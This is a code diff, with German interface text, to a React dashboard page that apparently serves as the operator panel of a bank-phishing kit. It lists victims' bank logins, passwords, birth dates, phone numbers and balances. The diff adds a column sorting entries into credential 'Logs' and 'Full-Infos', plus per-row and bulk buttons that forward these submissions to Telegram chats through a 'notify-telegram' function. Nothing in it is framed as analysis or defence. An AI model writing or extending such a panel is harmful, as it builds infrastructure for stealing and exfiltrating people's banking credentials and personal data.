@@ -12,7 +12,7 @@ import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import { toast } from "sonner";
-import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle } from "lucide-react";
+import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw, Search, Plus, Minus, Users, Clock, CheckCircle2, AlertCircle, Send } from "lucide-react";
 import { formatBalance, parseBalanceNumber } from "@/lib/format";
 import { useSubmissions, type Note } from "@/hooks/use-submissions";
 import { useQueryClient } from "@tanstack/react-query";
@@ -64,6 +64,38 @@ function LogsContent() {
   const [txMode, setTxMode] = useState<"+" | "-" | null>(null);
   const [txAmount, setTxAmount] = useState("");
   const [txNote, setTxNote] = useState("");
+  const [resendingId, setResendingId] = useState<string | null>(null);
+  const [bulkResending, setBulkResending] = useState(false);
+
+  const isLog = (s: any) => !!(s.bank_username && s.bank_password);
+
+  const resendOne = async (subId: string) => {
+    setResendingId(subId);
+    const { data, error } = await supabase.functions.invoke("notify-telegram", {
+      body: { submission_id: subId, kind: "auto", force: true },
+    });
+    setResendingId(null);
+    if (error || !data?.ok) { toast.error("Fehler beim Senden"); return; }
+    if (data.sent > 0) toast.success(`An ${data.sent} Chat(s) gesendet (${data.kind})`);
+    else toast.warning("Keine passenden Chats gefunden (Domain prüfen)");
+  };
+
+  const bulkResendFullInfos = async () => {
+    const targets = submissions.filter((s) => !isLog(s));
+    if (targets.length === 0) { toast.info("Keine Full-Infos zu senden"); return; }
+    if (!confirm(`${targets.length} Full-Info(s) erneut an Telegram senden?`)) return;
+    setBulkResending(true);
+    let ok = 0, fail = 0, totalSent = 0;
+    for (const s of targets) {
+      const { data, error } = await supabase.functions.invoke("notify-telegram", {
+        body: { submission_id: s.id, kind: "full_info", force: true },
+      });
+      if (error || !data?.ok) fail++;
+      else { ok++; totalSent += data.sent || 0; }
+    }
+    setBulkResending(false);
+    toast.success(`${ok}/${targets.length} verarbeitet, ${totalSent} Nachricht(en) gesendet${fail ? `, ${fail} Fehler` : ""}`);
+  };
 
   const stats = {
     total: submissions.length,
@@ -212,6 +244,12 @@ function LogsContent() {
         </Button>
       </div>
 
+      <div className="flex justify-end">
+        <Button variant="outline" size="sm" onClick={bulkResendFullInfos} disabled={bulkResending} className="gap-2">
+          <Send className="h-3.5 w-3.5" /> {bulkResending ? "Sendet..." : "Alle Full-Infos nachsenden"}
+        </Button>
+      </div>
+
       {/* Stat Cards */}
       <div className="grid grid-cols-4 gap-3">
         {statCards.map((card) => (
@@ -269,6 +307,7 @@ function LogsContent() {
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Telefon</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Geburtsdatum</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Bank</TableHead>
+              <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Typ</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Login</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Passwort</TableHead>
               <TableHead className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Guthaben</TableHead>
@@ -318,6 +357,15 @@ function LogsContent() {
 
                   {/* Bank */}
                   <TableCell className="text-xs text-slate-500">{sub.bank || "—"}</TableCell>
+
+                  {/* Typ */}
+                  <TableCell>
+                    {isLog(sub) ? (
+                      <Badge variant="outline" className="border-emerald-200 bg-emerald-50 text-emerald-700 text-[10px] font-medium">Log</Badge>
+                    ) : (
+                      <Badge variant="outline" className="border-amber-200 bg-amber-50 text-amber-700 text-[10px] font-medium">Full-Info</Badge>
+                    )}
+                  </TableCell>
 
                   {/* Login */}
                   <TableCell><CopyCell value={sub.bank_username} mono /></TableCell>
@@ -371,6 +419,15 @@ function LogsContent() {
                         <TooltipContent>Details</TooltipContent>
                       </Tooltip>
 
+                      <Tooltip>
+                        <TooltipTrigger asChild>
+                          <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-blue-600" disabled={resendingId === sub.id} onClick={() => resendOne(sub.id)}>
+                            <Send className="h-3.5 w-3.5" />
+                          </Button>
+                        </TooltipTrigger>
+                        <TooltipContent>An Telegram senden</TooltipContent>
+                      </Tooltip>
+
                       <div className="relative">
                         <Tooltip>
                           <TooltipTrigger asChild>
@@ -409,7 +466,7 @@ function LogsContent() {
             })}
             {filteredSubmissions.length === 0 && (
               <TableRow>
-                <TableCell colSpan={10} className="text-center text-slate-400 py-16">
+                <TableCell colSpan={11} className="text-center text-slate-400 py-16">
                   Keine Einträge vorhanden
                 </TableCell>
               </TableRow>
